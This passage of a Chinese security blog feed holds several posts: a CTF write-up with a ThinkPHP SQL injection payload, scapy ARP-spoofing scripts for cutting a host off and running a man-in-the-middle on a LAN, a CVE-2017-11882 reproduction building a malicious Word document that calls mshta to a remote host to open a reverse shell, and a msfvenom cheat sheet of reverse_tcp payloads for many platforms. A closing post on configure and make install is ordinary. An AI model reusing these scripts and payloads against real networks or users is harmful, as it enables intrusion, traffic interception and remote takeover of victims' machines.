    <link href="https://vuln.top/2019/02/21/137/"/>
    <id>https://vuln.top/2019/02/21/137/</id>
    <published>2019-02-21T03:56:01.637Z</published>
    <updated>2019-02-23T15:14:43.787Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->web题<br>—-<br>1.题目:小可爱<br>第一步肯定是绕过本地回环地址<br><img src="http://118.126.66.150/52sec/10/4285938054.png" alt="CC25B038-F2D2-4F85-93F7-F51924B8DAB8.png"><br>一开始想到的是<code>x-forward-for</code>等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了<code>referer</code>成功绕过<br><img src="http://118.126.66.150/52sec/10/1177985903.png" alt="BC410D27-3BE1-40E5-ABF5-777F7144F502.png"><br><img src="http://118.126.66.150/52sec/10/366387116.png" alt="AEA1A04B-27BA-4393-953B-75D948C95027.png"><br>这里没啥思路只能爆破<br><img src="http://118.126.66.150/52sec/10/2499653827.png" alt="B9E617B3-EF26-477B-B78C-534C490FB3C4.png"><br>密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！<br><img src="http://118.126.66.150/52sec/10/1630037561.png" alt="122FC809-D249-4228-9EB5-1E7F101BB7C1.png"><br><img src="http://118.126.66.150/52sec/10/296032636.png" alt="ADBC80E5-9B6D-4483-B1D4-286FE4B9E3F2.png"><br>将图片下载下来，用<code>binwalk</code>查看下发现有压缩包!<code>foremost</code>下得到压缩包发现有密码<br><img src="http://118.126.66.150/52sec/10/2054271.png" alt="70BBCD6F-2D2E-4D93-8F11-80D576A5CB54.png"><br><img src="http://118.126.66.150/52sec/10/2411784842.png" alt="DABA844F-3716-4889-96CA-04A7E6137C96.png"><br>这个地方解了很久发现使用Dilraba的md5。。。。<br><img src="http://118.126.66.150/52sec/10/2601915022.png" alt="F0312D7E-FC35-4DE9-86AF-D5A0F5796C97.png"><br>得到一张图片再一次foremost得到一个压缩包成功拿到flag<br><img src="http://118.126.66.150/52sec/10/2175607698.png" alt="C065BA1C-B8B1-4157-9E8A-D6BD23ED6440.png"><br>2.题目:单身二十年<br><img src="http://118.126.66.150/52sec/10/1468141901.png" alt="EA018BA0-F2BB-4204-9784-8E3585F3511B.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">if($_COOKIE[&apos;token&apos;]==&apos;5D41402ABC4B2A76B9719D911017C592&apos;)&#123; </span><br><span class="line">    $file    =    &apos;dump/&apos;.md5(base64_encode(mt_rand(1,100))).&apos;.txt&apos;; </span><br><span class="line">    file_put_contents($file,file_get_contents(&apos;327A6C4304AD5938EAF0EFB6CC3E53DC.php&apos;)); </span><br><span class="line">    sleep(10); </span><br><span class="line">    unlink($file); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    header(&apos;Location: index.php&apos;); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">setcookie(&quot;token&quot;); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。<br>一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。<br><img src="http://118.126.66.150/52sec/10/3316060136.png" alt="9BB9177B-2227-4784-A0BB-B029ED948AF3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">for i in range(1,101):</span><br><span class="line">headers = &#123;&apos;Content-type&apos;:&apos;text/html;charset=utf-8&apos;&#125;</span><br><span class="line">encodestr = base64.b64encode(str(i).encode(&apos;utf-8&apos;))</span><br><span class="line">cookies = &#123;&apos;token&apos;:&apos;5D41402ABC4B2A76B9719D911017C592&apos;&#125;</span><br><span class="line">#print(encodestr)</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(encodestr)</span><br><span class="line">#print(m.hexdigest())</span><br><span class="line">a = m.hexdigest()</span><br><span class="line">url = &apos;http://106.14.145.133:8081/web10/dump/&apos;+a+&apos;.txt&apos;</span><br><span class="line">#print(url)</span><br><span class="line">url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2)</span><br><span class="line">#print(url_get.headers)</span><br><span class="line">#print(url_get.cookies)</span><br><span class="line">if url_get.status_code == 200:</span><br><span class="line">print(url_get.text)</span><br></pre></td></tr></table></figure></p><p>3.题目:初心不改<br><img src="http://118.126.66.150/52sec/10/2370270929.png" alt="1975DE5B-D07B-4569-B8D0-E7171F2A034C.png"><br>访问页面发现是一个thinkphp5.0 一猜就是sql注入<br>一开始以为是构造一个注入然后load_file到flag后来发现想多了，直接通过payload拿到mysql账号密码<br><code>/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code><br><img src="http://118.126.66.150/52sec/10/2511860583.png" alt="BA7D4195-9527-4B06-A1D8-28ABF453FE46.png"><br>主页查看源码发现有一个phpmyadmin，登陆后成功拿到flag<br><img src="http://118.126.66.150/52sec/10/3803853201.png" alt="73F165EC-C956-40AD-9106-ADE323691340.png"></p><p>web题我是全部AK掉了有些题目是通过exp直接拿到flag太简单了就不讲了。<br><img src="http://118.126.66.150/52sec/10/3180203719.png" alt="ADE2EF99-DEF7-46F4-AA7D-066EC4402E12.png"></p><h2 id="Crypto题"><a href="#Crypto题" class="headerlink" title="Crypto题"></a>Crypto题</h2><p>1.题目:震惊，凯撒竟被4人关在一密室<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">凯撒被4个人关在一个密室里！</span><br><span class="line">aCU3QjkxMjkxMTA3bjVnMTZoNjNjJTdEY2cwNDBoM2g4aTRlMDc3ZmYz</span><br></pre></td></tr></table></figure></p><p>先是base64<br><img src="http://118.126.66.150/52sec/10/4195125983.png" alt="9B275494-53D5-4527-8A72-F5844E6A5CD8.png"><br>然后url编码<br><img src="http://118.126.66.150/52sec/10/1834402293.png" alt="647F179F-6624-426A-924B-3538D10E806A.png"><br>栅栏编码四组<br><img src="http://118.126.66.150/52sec/10/3756062370.png" alt="9D959343-EA85-4A6D-85A4-7D017E27DDE7.png"><br>凯撒拿到flag<br><img src="http://118.126.66.150/52sec/10/2613812638.png" alt="9192AE6D-3539-4AC4-83FD-97E3D50A533A.png"></p><p>2.题目:粗心大意的主管<br>已知密文为:925♥♥♥A2D74♥♥DDE4♥EBC0♥♥♥1D0E♥♥7<br>原文为:8E5♥♥C14DCD♥CDE8♥♥55F3738♥11DE7A。<br>写个python就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import string</span><br><span class="line">import hashlib</span><br><span class="line">payloads = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">for a in payloads:</span><br><span class="line">    for b in payloads:</span><br><span class="line">        for c in payloads:</span><br><span class="line">        for d in payloads:</span><br><span class="line">        for e in payloads:</span><br><span class="line">        for f in payloads:</span><br><span class="line">            s = &quot;8E5&quot;+a+d+&quot;C14DCD&quot;+b+&quot;CDE8&quot;+e+c+&quot;55F3738&quot;+f+&quot;11DE7A&quot;</span><br><span class="line">            tmp = hashlib.md5(s).hexdigest().upper()</span><br><span class="line">            if &apos;925&apos; in tmp and &apos;A2D74&apos; in tmp and &apos;DDE4&apos; in tmp and &apos;EBC0&apos; in tmp:</span><br><span class="line">                print(s)</span><br><span class="line">               print(tmp)</span><br></pre></td></tr></table></figure></p><p>3.题目:畸形的凯撒<br>密文：afZ_rCI[kA55#;ASc9*%$c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char=&quot;afZ_rCI[kA55#;ASc9*%$c&quot;</span><br><span class="line">i = 0</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">while i &lt; len(char):</span><br><span class="line">num = ord(char[i])+(i+5)</span><br><span class="line">flag+=chr(num)</span><br><span class="line">i+=1</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><p>1.题目:机密文件<br>用NET.Reflector Pro工具打开文件<br><img src="http://118.126.66.150/52sec/10/2721756916.png" alt="6B517F8B-57C6-43CC-AD32-AF739244D967.png"><br>看到源代码<br>发现是aes加密使用openssl解密或者用c#再写一个解密的<br>password也在里面<br><img src="http://118.126.66.150/52sec/10/3386985755.png" alt="27E2F10D-6444-4F29-A275-9BBA743B8386.png"><br><img src="http://118.126.66.150/52sec/10/618023056.png" alt="593D7C75-0E7F-4421-A4C7-A572F8ED6572.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-128-cbc -nosalt -d -in secret.636748579460890458.bin -iv 6b6a704853325367344c716637754e65 -K 6b6a704853325367344c716637754e65 -p</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;web题&lt;br&gt;—-&lt;br&gt;1.题目:小可爱&lt;br&gt;第一步肯定是绕过本地回环地址&lt;br&gt;&lt;img src=&quot;http://118.126.66.150/52sec/10/4285938054.png&quot; alt=&quot;CC25B038-F2D2-4F85-
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python 实现局域网内arp欺骗</title>
    <link href="https://vuln.top/2019/02/21/9/"/>
    <id>https://vuln.top/2019/02/21/9/</id>
    <published>2019-02-21T03:45:07.021Z</published>
    <updated>2019-02-21T03:45:07.030Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->arp协议数据包<br>——–<br><img src="http://image.3001.net/images/20180116/15160949496413.png" alt="请输入图片描述"><br>op:1(op值为1说明这是一次arp请求)<br>hwsrc：发送方MAC地址（即本机器MAC地址）<br>psrc：发送方ip地址（即本机内网ip地址）<br>hwdst：目标MAC地址（在这里为未知00：00：00：00：00：00）<br>pdst：目标ip地址（即网关ip地址，一般为192.168.0.1/192.168.1.1）<br>局域网内所有机器接收此arp请求，如果发现请求的ip为自己的ip便会向请求机器发送arp响应，将自己的MAC地址带入arp响应包单播发送给请求的机器，arp响应包主要字段如下<br>op:2(op值为2说明这是一次arp响应)<br>hwsrc：发送方MAC地址（即网关MAC地址）<br>psrc：发送方ip地址（即网关ip地址）<br>hwdst：目标MAC地址（为发起arp请求的机器的MAC地址）<br>pdst：目标ip地址（为发起arp请求的机器的ip地址）<br><br><br>代码1:<br>对单个ip进行arp欺骗 断网<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line">from scapy.all import *</span><br><span class="line">tip = &quot;192.168.235.136&quot;</span><br><span class="line">gip = &quot;192.168.235.2&quot;</span><br><span class="line">tmip = getmacbyip(tip)</span><br><span class="line">gmip = getmacbyip(gip)</span><br><span class="line">localmac = get_if_hwaddr(&quot;eth0&quot;)</span><br><span class="line">sendArp = Ether(dst=tmip,src=localmac)/ARP(op=1,psrc=gip,hwsrc=localmac,pdst=tip,hwdst=tmip) </span><br><span class="line">while 1:</span><br><span class="line">    sendp(sendArp,inter=2,iface=&quot;eth0&quot;)</span><br></pre></td></tr></table></figure><p>arp欺骗中间人攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line">from scapy.all import *</span><br><span class="line">tip = &quot;192.168.235.136&quot;</span><br><span class="line">gip = &quot;192.168.235.2&quot;</span><br><span class="line">tmip = getmacbyip(tip)</span><br><span class="line">gmip = getmacbyip(gip)</span><br><span class="line">localmac = get_if_hwaddr(&quot;eth0&quot;)</span><br><span class="line">sendArp = Ether(dst=tmip,src=localmac)/ARP(op=1,psrc=gip,hwsrc=gmip,pdst=tip,hwdst=tmip) </span><br><span class="line">while 1:</span><br><span class="line">    sendp(sendArp,inter=2,iface=&quot;eth0&quot;)</span><br></pre></td></tr></table></figure></p><p>arp 欺骗整个局域网:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line">from scapy.all import *</span><br><span class="line">#tip = &quot;192.168.235.136&quot;</span><br><span class="line">gip = &quot;192.168.235.2&quot;</span><br><span class="line">#tmip = getmacbyip(tip)</span><br><span class="line">gmip = getmacbyip(gip)</span><br><span class="line">localmac = get_if_hwaddr(&quot;eth0&quot;)</span><br><span class="line">sendArp = srploop(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(hwsrc=gmip,psrc=gip,op=2))</span><br><span class="line">while 1:</span><br><span class="line">    try:</span><br><span class="line">        sendp(sendArp,inter=2,iface=&quot;eth0&quot;)</span><br><span class="line">        if is_sigint_up:</span><br><span class="line">            print &quot;exit&quot;</span><br><span class="line">            is_sigint_up=False</span><br><span class="line">            cotinue</span><br><span class="line">    except:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;arp协议数据包&lt;br&gt;——–&lt;br&gt;&lt;img src=&quot;http://image.3001.net/images/20180116/15160949496413.png&quot; alt=&quot;请输入图片描述&quot;&gt;&lt;br&gt;op:1(op值为1说明这是一次arp请
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-11882复现</title>
    <link href="https://vuln.top/2019/02/21/66/"/>
    <id>https://vuln.top/2019/02/21/66/</id>
    <published>2019-02-21T03:45:06.761Z</published>
    <updated>2019-02-23T15:25:44.805Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->漏洞环境<br>—-<br>攻击机:kali linux<br>靶机:windows 7 旗舰版<br>工具及说明<br>—-<br>CVE-2017-11882漏洞利用复现<br>2017年11月14日微软发布了潜伏17年之久的office远程代码执行漏洞（cve-2017-11882）。该漏洞为office内存破坏漏洞，影响目前流行的office版本。<br>首先到github上下载一个poc<br>原脚本来自于 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们下载这个 ```https://github.com/iBearcat/CVE-2017-11882</span><br></pre></td></tr></table></figure><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一步:：python Command_CVE-2017-11882.py -c “cmd.exe /c calc.exe” -o test.doc</span><br></pre></td></tr></table></figure><p><img src="http://118.126.66.150/52sec/08/1330119719.png" alt="10fb1511876761.png"><br>如果成功的话是这样的</p><p>现在我们反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载koadic</span><br><span class="line">安装 git clone https://github.com/zerosum0x0/koadic.git</span><br><span class="line">使用 ./koadic</span><br></pre></td></tr></table></figure></p><p><img src="http://118.126.66.150/52sec/08/3346544335.png" alt="09dd1511876776.png"><br>设置LHOST 端口默认9999我们不变<br><img src="http://118.126.66.150/52sec/08/3350927297.png" alt="82661511876798.png"><br>这里可能有utf-8的报错解决方法如下<br><img src="http://118.126.66.150/52sec/08/2706007116.png" alt="602e1511876855.png"><br>wq保存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">方法：python Command_CVE-2017-11882.py -c “mshta http://site.com/abc“ -o test.doc</span><br></pre></td></tr></table></figure></p><p><img src="http://118.126.66.150/52sec/08/4278044751.png" alt="7afb1511876876.png"><br>打开word 拿到权限<br><img src="http://118.126.66.150/52sec/08/302886616.png" alt="586e1511876901.png"></p><p>结束</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;漏洞环境&lt;br&gt;—-&lt;br&gt;攻击机:kali linux&lt;br&gt;靶机:windows 7 旗舰版&lt;br&gt;工具及说明&lt;br&gt;—-&lt;br&gt;CVE-2017-11882漏洞利用复现&lt;br&gt;2017年11月14日微软发布了潜伏17年之久的office远程代码
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>msfvenom 进阶</title>
    <link href="https://vuln.top/2019/02/21/45/"/>
    <id>https://vuln.top/2019/02/21/45/</id>
    <published>2019-02-21T03:45:06.153Z</published>
    <updated>2019-02-21T03:45:06.162Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->最近在看msfvenom生成木马感觉这个文章不错就搬过来了，下面有表哥的博客原地址<br><br>0x01 msfvenom 常规选项用途:<br><br>1. -l  列出所有可用的payload,编码器,空指令……<br>2. -p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的<br>3. -f  指定payload输出的文件类型,–help-formats,可查看支持的所有输出格式<br>4. -e  指定要使用那种编码器<br>5. -i  指定编码的次数,如果使用编码器<br>6. -b  指定坏字符,比如空字符截断问题,等等……<br>7. -x  使用一个自定义可执行程序模板,并将payload嵌入其中<br>8. -k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用<br>9. -o  指定创建好的payload的存放位置<br>0x02 首先,创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set lport 443</span><br><span class="line">msf &gt; set lhost 192.168.3.12</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure><p>0x03 实例创建各类系统平台下的payload:<br>windows 平台,普通的exe 直接双击即可触发,会弹回一个常规meterpreter</p><blockquote><p>msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 3 -f exe -o x86_shell.exe</p></blockquote><p>powershell,把文件中编码后的powershell payload代码直接抠出来,丢到目标机器的cmd中去执行触发,会弹回一个powershell的shell</p><blockquote><p>msfvenom -a x86 –platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1</p></blockquote><p>linux 平台,直接赋予执行权限,执行即可触发,关于如何将payload嵌入deb或者rpm包中,我们后续再单独说</p><blockquote><p>msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f elf -o x86_shell</p></blockquote><p>mac 平台,暂没实际测试</p><blockquote><p>msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f macho -o x86_shell.macho</p></blockquote><p>android平台 注意这里生成的apk是不能直接被装到手机上的,还需要你自己给apk签个名才能装,装完以后点击打开即可触发,关于如何向正常的app中嵌入msf的payload后期也会单独再说明</p><blockquote><p>msfvenom -a x86 –platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f apk -o x86_shell.apk</p></blockquote><p>基于各类web脚本,对于此类的web脚本触发执行方法非常简单,直接在url中访问该脚本即可<br>php 脚本</p><blockquote><p>msfvenom –platform PHP -p php/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.php</p></blockquote><p>aspx 脚本</p><blockquote><p>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f aspx -o x86_shell.aspx</p></blockquote><p>jsp 脚本</p><blockquote><p>msfvenom –platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.jsp</p></blockquote><p>war包,找个能部署war包的地方,如各类java控制台,部署一下即可执行</p><blockquote><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.war</p></blockquote><p>基于其它各类脚本的payload,说几个实战中可能会碰到的语言环境</p><p>nodejs</p><blockquote><p>msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.js</p></blockquote><p>python</p><blockquote><p>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.py</p></blockquote><p>perl</p><blockquote><p>msfvenom -p cmd/unix/reverse_perl LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.pl</p></blockquote><p>ruby</p><blockquote><p>msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.rb</p></blockquote><p>lua</p><blockquote><p>msfvenom -p cmd/unix/reverse_lua LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.lua</p></blockquote><p>0x04 利用wireshark观察不同协议下的payload的运作细节:</p><p>bind类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp</span><br><span class="line">windows/meterpreter/bind_tcp_rc4</span><br><span class="line">windows/meterpreter/bind_hidden_tcp</span><br></pre></td></tr></table></figure><p>reverse类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/reverse_tcp</span><br><span class="line">windows/meterpreter/reverse_tcp_dns</span><br><span class="line">windows/meterpreter/reverse_tcp_rc4</span><br><span class="line">windows/meterpreter/reverse_tcp_rc4_dns</span><br><span class="line">windows/meterpreter/reverse_http</span><br><span class="line">windows/meterpreter/reverse_https</span><br></pre></td></tr></table></figure></p><p>32位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure></p><p>64位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></p><p>0x05 生成不同平台下的shellcode<br>win平台shellcode</p><blockquote><p>msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f c</p></blockquote><p>linux平台shellcode</p><blockquote><p>msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f c</p></blockquote><p>mac平台shellcode</p><blockquote><p>msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f c</p></blockquote><p>0x06 将普通类型的shell升级为meterpreter:</p><p>post/multi/manage/shell_to_meterpreter</p><p>原文章地址:<a href="https://klionsec.github.io/2017/03/08/msfvenom-advanced/" target="_blank" rel="noopener">https://klionsec.github.io/2017/03/08/msfvenom-advanced/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;最近在看msfvenom生成木马感觉这个文章不错就搬过来了，下面有表哥的博客原地址&lt;br&gt;&lt;br&gt;0x01 msfvenom 常规选项用途:&lt;br&gt;&lt;br&gt;1. -l  列出所有可用的payload,编码器,空指令……&lt;br&gt;2. -p  指定要使用
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux软件安装 ./configure,make,make install的作用</title>
    <link href="https://vuln.top/2019/02/21/40/"/>
    <id>https://vuln.top/2019/02/21/40/</id>
    <published>2019-02-21T03:45:05.948Z</published>
    <updated>2019-02-21T03:45:05.961Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->自行安装编译Linux软件过程中会执行三个步骤：./configure,make,make install。这三个步骤在安装过程中到底起到什么作用，先前一直糊里糊涂的，今天就来一起学习下。<br><br>./configure(配置）<br>configure会根据当前系统环境和指定参数生成makefile文件，为下一步的编译做准备，你可以通过在 configure 后加上参数来对安装进行控制，比如代码:./configure –prefix=/usr 意思是将该软件安装在 /usr 下面，执行文件就会安装在 /usr/bin （而不是默认的 /usr/local/bin),资源文件就会安装在 /usr/share（而不是默认的/usr/local/share）。同时一些软件的配置文件你可以通过指定 –sys-config= 参数进行设定。有一些软件还可以加上 –with、–enable、–without、–disable 等等参数对编译加以控制，你可以通过允许 ./configure –help 察看详细的说明帮助。它常用的参数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">–help：输出帮助信息</span><br><span class="line">–prefix=PREFIX：将所有文件安装到PREFIX文件夹下。实际上不同的文件会被安装到不同的子文件夹中。</span><br><span class="line">–exec-prefix=EXEC-PREFIX：结构依赖文件的安装位置。默认与PREFIX相同。</span><br><span class="line">–bindir=BINDIR：可执行程序目录。默认为EXEC-PREFIX/bin。</span><br><span class="line">–datadir=DATADIR：程序所需只读文件的目录。默认为PREFIX/share。</span><br><span class="line">–sysconfdir=SYSCONFDIR：配置文件的目录。默认为PREFIX/etc。</span><br><span class="line">–libdir=LIBDIR：库文件和动态装在模块的目录。默认为EXEC-PREFIX/lib。</span><br><span class="line">–includedir=INCLUDEDIR：C和C++头文件的目录。默认是PREFIX/include。</span><br><span class="line">–docdir=DOCDIR：文档文件目录。默认是PREFIX/doc。</span><br><span class="line">–mandir=MANDIR：手册目录。默认是PREFIX/man。</span><br><span class="line">–with-includes=DIRS：DIRS是一系列冒号分隔的文件夹，这些目录被加入到编译器的头文件中。例如：–with-includes=/opt/gun/includes/</span><br><span class="line">–with-libraries=DIRS：DIRS是一系列冒号分隔的文件夹，这些目录用于查找库文件。例如：–with-libraries=/opt/gnu/lib:/usr/sup/lib</span><br><span class="line">–enable-locale：打开区域支持。</span><br><span class="line">–enable-recode：打开单字节字符集记录的支持。</span><br><span class="line">–enable-multibyte：允许使用多字节编码。</span><br></pre></td></tr></table></figure><p>make（编译）<br>make，这一步就是编译，当执行make的时候，make会在当前目录下搜索Makefile（makefile）这个文本文件，而makefile里面记录了源码如何编译的详细信息。</p><p>make install（安装）<br>make insatll，这条命令来进行安装，这一步一般需要你有 root 权限（因为要向系统写入文件）。</p><p>其他命令：</p><p><code>make clean</code> 清除编译产生的可执行文件及目标文件。<br><code>make distclean </code>除了清除可执行文件和目标文件外，把configure所产生的Makefile也清除掉。<br><code>make dist </code>将程序和相关的档案包装成一个压缩文件以供发布。<br>怎么卸载编译安装(make install)的软件？<br>使用安装包自带的反安装程序<br>常见的反安装target有： make uninstall/distclean/veryclean 等，但并不是每个源代码包都提供反安装，这不是个通用方法等。</p><p>通过删除编译时设置的单独目录<br>如果编译时设置了–prefix到一个单独的文件夹，就删除那个文件夹即可，但如果编译安装到了类似/usr这种地方，找一个临时目录重新安装一遍，如：</p><p><code>./configure –prefix=/tmp/to_remove &amp;&amp; make 